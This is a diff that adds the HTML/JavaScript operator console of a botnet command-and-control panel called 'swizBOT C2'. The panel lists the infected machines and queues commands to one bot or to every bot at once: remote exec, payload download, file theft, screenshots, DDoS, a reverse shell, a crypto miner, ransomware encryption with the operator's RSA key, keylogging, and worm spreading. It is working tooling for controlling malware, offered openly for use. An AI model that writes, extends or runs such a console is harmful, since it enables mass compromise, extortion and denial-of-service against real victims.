@@ -1,0 +1,295 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>swizBOT C2</title>
+<style>
+  * { margin: 0; padding: 0; box-sizing: border-box; }
+  body { background:#0b0f0b; color:#9dffb0; font: 14px/1.45 "Cascadia Code","Fira Code","Courier New",monospace; height:100vh; display:flex; flex-direction:column; }
+  a { color:#9dffb0; }
+  header { display:flex; align-items:center; gap:18px; padding:10px 16px; background:#050a06; border-bottom:1px solid #1d3a24; }
+  header .title { font-weight:700; letter-spacing:2px; font-size:16px; }
+  header .sub { color:#4f8a5e; font-size:12px; }
+  .stats { margin-left:auto; display:flex; gap:24px; text-align:right; }
+  .stats b { display:block; font-size:18px; }
+  .stats span { color:#4f8a5e; font-size:10px; letter-spacing:1px; }
+  main { flex:1; display:flex; min-height:0; }
+  aside { width:340px; border-right:1px solid #1d3a24; overflow-y:auto; background:#070d08; }
+  .bot { padding:9px 12px; border-bottom:1px solid #122316; cursor:pointer; }
+  .bot:hover { background:#0f1f13; }
+  .bot.sel { background:#12301b; border-left:3px solid #3ddc6a; }
+  .bot .id { font-weight:700; font-size:13px; }
+  .bot .meta { color:#4f8a5e; font-size:11px; }
+  .bot .st { font-size:10px; margin-top:2px; }
+  .on { color:#3ddc6a; } .off { color:#ff5c5c; }
+  section { flex:1; display:flex; flex-direction:column; min-width:0; }
+  .bar { padding:10px 14px; border-bottom:1px solid #1d3a24; background:#050a06; display:flex; gap:8px; flex-wrap:wrap; align-items:center; }
+  select, input, textarea, button { background:#0b0f0b; color:#9dffb0; border:1px solid #245231; padding:6px 8px; font:inherit; border-radius:2px; }
+  button { cursor:pointer; }
+  button:hover { border-color:#3ddc6a; }
+  button.send { background:#1d6b31; border-color:#1d6b31; color:#dfffe7; font-weight:700; }
+  button.danger { background:#6b1d1d; border-color:#6b1d1d; color:#ffd9d9; }
+  .row { display:flex; gap:8px; align-items:center; }
+  .fields { display:flex; gap:8px; flex-wrap:wrap; align-items:center; width:100%; margin-top:6px; }
+  .fields label { color:#4f8a5e; font-size:11px; }
+  .hidden { display:none !important; }
+  textarea { width:100%; min-height:70px; resize:vertical; }
+  .out { flex:1; overflow-y:auto; padding:10px 14px; }
+  .line { white-space:pre-wrap; word-break:break-word; margin:2px 0; font-size:13px; }
+  .line .t { color:#4f8a5e; }
+  .cmd { color:#ffcf6b; } .res { color:#b7ffc9; } .err { color:#ff8080; } .info { color:#6fae7f; }
+  .empty { color:#3c5a44; text-align:center; margin-top:40px; }
+  #loginWrap { position:fixed; inset:0; background:rgba(0,0,0,.8); display:none; align-items:center; justify-content:center; }
+  #loginWrap .box { background:#0b0f0b; border:1px solid #245231; padding:24px; width:340px; }
+  #loginWrap h2 { font-size:15px; margin-bottom:12px; }
+</style>
+</head>
+<body>
+<header>
+  <div class="title">swizBOT C2</div>
+  <div class="sub">implant fleet console</div>
+  <div class="stats">
+    <div><b id="stOnline">0</b><span>ONLINE</span></div>
+    <div><b id="stTotal">0</b><span>TOTAL</span></div>
+  </div>
+</header>
+<main>
+  <aside id="bots"></aside>
+  <section>
+    <div class="bar">
+      <select id="cmdType">
+        <option value="exec">exec</option>
+        <option value="download">download</option>
+        <option value="fetch">fetch</option>
+        <option value="screenshot">screenshot</option>
+        <option value="ddos">ddos</option>
+        <option value="shell">shell</option>
+        <option value="miner">miner</option>
+        <option value="ransomware">ransomware</option>
+        <option value="keylog">keylog</option>
+        <option value="worm">worm</option>
+        <option value="kill">kill</option>
+      </select>
+      <div class="row">
+        <input type="checkbox" id="broadcast"><label for="broadcast">broadcast</label>
+      </div>
+      <button class="send" id="sendBtn">SEND</button>
+      <div class="fields" id="fields"></div>
+    </div>
+    <div class="out" id="out"></div>
+  </section>
+</main>
+<div id="loginWrap"><div class="box">
+  <h2>Operator token required</h2>
+  <input type="password" id="tok" placeholder="token" style="width:100%;margin-bottom:10px">
+  <button id="tokBtn" style="width:100%">UNLOCK</button>
+</div></div>
+
+<script>
+"use strict";
+let bots = [];
+let selected = null;
+let ws = null;
+
+const $ = id => document.getElementById(id);
+
+const fieldSpecs = {
+  exec:        [{k:"cmd",  p:"command", def:"whoami", w:300}],
+  download:    [{k:"url",  p:"http://host/payload.exe", def:"", w:360}],
+  fetch:       [{k:"path", p:"remote file path", def:"", w:360}],
+  screenshot:  [],
+  ddos:        [{k:"tgt",  p:"host:port", def:"", w:160},
+                {k:"method", p:"method", def:"udp", w:110, opts:["udp","tcp","http"]},
+                {k:"dur",  p:"duration s", def:"60", w:90}],
+  shell:       [{k:"host", p:"host", def:"", w:160},{k:"port", p:"port", def:"4444", w:80}],
+  miner:       [{k:"pool", p:"pool", def:"", w:220},{k:"wal", p:"wallet", def:"", w:220},
+                {k:"thr",  p:"threads", def:"4", w:80},{k:"src", p:"path/url (optional)", def:"", w:220}],
+  ransomware:  [{k:"pem", p:"operator RSA public key (PEM)", def:"", w:0, area:true}],
+  keylog:      [{k:"path", p:"log path (optional)", def:"", w:280}],
+  worm:        [{k:"subs", p:"subnets CSV (optional)", def:"", w:280}],
+  kill:        []
+};
+
+function renderFields() {
+  const type = $("cmdType").value;
+  const box = $("fields");
+  box.innerHTML = "";
+  const spec = fieldSpecs[type] || [];
+  spec.forEach(f => {
+    const label = document.createElement("label");
+    label.textContent = f.p;
+    box.appendChild(label);
+    if (f.area) {
+      const ta = document.createElement("textarea");
+      ta.placeholder = f.def || "";
+      ta.id = "f_" + f.k;
+      box.appendChild(ta);
+    } else {
+      const inp = document.createElement("input");
+      inp.placeholder = f.def || "";
+      inp.id = "f_" + f.k;
+      if (f.w) inp.style.width = f.w + "px";
+      if (f.opts) {
+        const sel = document.createElement("select");
+        sel.id = "f_" + f.k;
+        f.opts.forEach(o => { const op = document.createElement("option"); op.value = o; op.textContent = o; sel.appendChild(op); });
+        box.replaceChild(sel, inp);
+      } else {
+        box.appendChild(inp);
+      }
+    }
+  });
+  $("broadcast").disabled = type === "kill";
+}
+
+function buildPayload() {
+  const type = $("cmdType").value;
+  const v = k => { const el = $("f_" + k); return el ? el.value.trim() : ""; };
+  switch (type) {
+    case "exec": return v("cmd");
+    case "download": return v("url");
+    case "ddos": { const t = v("tgt"), m = v("method"), d = v("dur"); return t ? [t, m || "udp", d || "60"].join(" ") : ""; }
+    case "shell": { const h = v("host"), p = v("port"); return (h && p) ? h + " " + p : ""; }
+    case "miner": { const a = [v("pool"), v("wal"), v("thr") || "4"].filter(x => x !== ""); const s = v("src"); if (s) a.push(s); return a.join(" "); }
+    case "ransomware": return v("pem").replace(/\n/g, "\\n");
+    case "keylog": return v("path");
+    case "worm": return v("subs");
+    case "kill": return "";
+  }
+  return "";
+}
+
+function addLine(cls, text) {
+  const out = $("out");
+  const d = document.createElement("div");
+  d.className = "line " + cls;
+  const t = document.createElement("span");
+  t.className = "t";
+  const now = new Date().toISOString().substr(11, 8);
+  t.textContent = now + " ";
+  const b = document.createElement("span");
+  b.textContent = text;
+  d.appendChild(t); d.appendChild(b);
+  out.appendChild(d);
+  out.scrollTop = out.scrollHeight;
+}
+
+function botRows() {
+  const box = $("bots");
+  box.innerHTML = "";
+  if (!bots.length) {
+    const e = document.createElement("div");
+    e.className = "empty";
+    e.textContent = "waiting for implants...";
+    box.appendChild(e);
+    return;
+  }
+  bots.forEach(b => {
+    const d = document.createElement("div");
+    d.className = "bot" + (selected === b.id ? " sel" : "");
+    d.onclick = () => { selected = b.id; renderBots(); addLine("info", "selected " + b.id); };
+    const id = document.createElement("div"); id.className = "id"; id.textContent = b.id;
+    const meta = document.createElement("div"); meta.className = "meta";
+    meta.textContent = (b.os || "?") + " / " + (b.arch || "?") + "  " + (b.ip || "");
+    const st = document.createElement("div"); st.className = "st";
+    st.textContent = b.active ? "ONLINE" : "offline  last seen " + (b.last_seen || "never");
+    st.classList.add(b.active ? "on" : "off");
+    d.appendChild(id); d.appendChild(meta); d.appendChild(st);
+    box.appendChild(d);
+  });
+}
+
+function renderBots() {
+  const online = bots.filter(b => b.active).length;
+  $("stOnline").textContent = online;
+  $("stTotal").textContent = bots.length;
+  botRows();
+}
+
+async function sendCommand() {
+  const type = $("cmdType").value;
+  const payload = buildPayload();
+  const botID = $("broadcast").checked ? "*" : selected;
+
+  if (!botID) { addLine("err", "select a bot or enable broadcast"); return; }
+  if (type === "kill" && !confirm("kill bot " + botID + "? this uninstalls persistence and exits")) return;
+  if (type === "ransomware" && !confirm("encrypt user files on " + botID + "? this is irreversible")) return;
+  if (!payload && type !== "kill" && type !== "worm" && type !== "keylog" && type !== "screenshot") { addLine("err", "fill in the payload fields"); return; }
+
+  addLine("cmd", "> " + botID + " " + type + (payload ? " " + payload : ""));
+  try {
+    const r = await fetch("/api/command", {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify({ bot_id: botID, type: type, payload: payload, target: "" })
+    });
+    if (r.status === 401) { needLogin(); return; }
+    const j = await r.json().catch(() => ({}));
+    if (r.ok) addLine("info", "queued: " + (j.message || "ok"));
+    else addLine("err", "queue failed: " + (j.message || r.status));
+  } catch (e) {
+    addLine("err", "request error: " + e);
+  }
+}
+
+async function refresh() {
+  try {
+    const r = await fetch("/api/bots");
+    if (r.status === 401) { needLogin(); return; }
+    bots = await r.json();
+    renderBots();
+  } catch (e) { /* offline */ }
+}
+
+function needLogin() {
+  $("loginWrap").style.display = "flex";
+}
+
+async function doLogin() {
+  const tok = $("tok").value.trim();
+  if (!tok) return;
+  try {
+    const r = await fetch("/login?token=" + encodeURIComponent(tok), { redirect: "manual" });
+    if (r.ok || r.type === "opaqueredirect" || r.status === 302 || r.status === 200) {
+      $("loginWrap").style.display = "none";
+      $("tok").value = "";
+      connectWS();
+      refresh();
+      addLine("info", "authenticated");
+    } else {
+      addLine("err", "bad token");
+    }
+  } catch (e) { addLine("err", "login error: " + e); }
+}
+
+function connectWS() {
+  if (ws) { try { ws.close(); } catch (e) {} }
+  const proto = location.protocol === "https:" ? "wss:" : "ws:";
+  ws = new WebSocket(proto + "//" + location.host + "/ws");
+  ws.onmessage = ev => {
+    let m; try { m = JSON.parse(ev.data); } catch (e) { return; }
+    if (m.type === "bot_update" && m.bots) { bots = m.bots; renderBots(); }
+    else if (m.type === "command_result") {
+      const head = "[" + m.bot_id + "] " + (m.command_id || "");
+      if (m.status === "success") addLine("res", head + "\n" + m.output);
+      else addLine("err", head + " (" + m.status + ")\n" + m.output);
+      refresh();
+    }
+  };
+  ws.onclose = () => { setTimeout(connectWS, 3000); };
+}
+
+$("cmdType").addEventListener("change", renderFields);
+$("sendBtn").addEventListener("click", sendCommand);
+$("tokBtn").addEventListener("click", doLogin);
+$("tok").addEventListener("keydown", e => { if (e.key === "Enter") doLogin(); });
+
+renderFields();
+addLine("info", "console ready");
+connectWS();
+refresh();
+setInterval(refresh, 5000);
+</script>
+</body>
+</html>
